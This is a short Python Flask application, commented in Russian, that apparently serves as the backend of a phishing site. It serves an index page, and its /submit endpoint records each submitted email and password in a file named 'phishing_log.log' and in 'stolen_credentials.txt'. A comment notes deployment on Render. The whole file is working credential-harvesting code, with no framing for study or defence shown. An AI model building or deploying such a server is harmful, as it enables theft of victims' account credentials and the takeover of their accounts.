import os
from flask import Flask, request, render_template
import logging

app = Flask(__name__)

# Настраиваем логирование
logging.basicConfig(filename="phishing_log.log", level=logging.INFO, format="%(asctime)s - %(message)s")

@app.route("/")
def index():
    return render_template("index.html")  # Главная страница

@app.route("/submit", methods=["POST"])
def submit():
    data = request.json
    email = data.get("email")
    password = data.get("password")

    logging.info(f"Email: {email}, Password: {password}")

    with open("stolen_credentials.txt", "a") as f:
        f.write(f"Email: {email}, Password: {password}\n")

    return "Data received", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))  # Render использует переменную PORT
    app.run(host="0.0.0.0", port=port, debug=False)
